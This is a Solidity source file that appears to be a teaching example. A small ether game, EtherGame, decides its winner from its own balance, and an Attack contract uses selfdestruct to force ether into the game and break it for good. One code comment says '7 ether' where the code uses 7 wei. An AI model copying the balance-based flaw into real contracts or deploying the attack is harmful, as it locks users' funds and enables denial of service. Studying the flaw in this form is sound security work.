// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGame {
    uint256 public constant TARGET_AMOUNT = 7 wei;
    address public winner;

    function playGame() external payable {
        require(msg.value == 1 wei, "msg.value is not 1 wei.");
        uint256 balance = address(this).balance;

        require(balance <= TARGET_AMOUNT, "Game is over.");

        if (balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
    }

    function reclaimGameBonus() external {
        require(msg.sender == winner, "sender is not winner.");
        (bool ret,) = winner.call{value: address(this).balance}("");
        require(ret, "reclaim failed.");

        // can replay the game again.
        winner = address(0);
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(address _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether
        // cast address to payable
        address addr = address(etherGame);
        selfdestruct(payable(addr));
    }
}
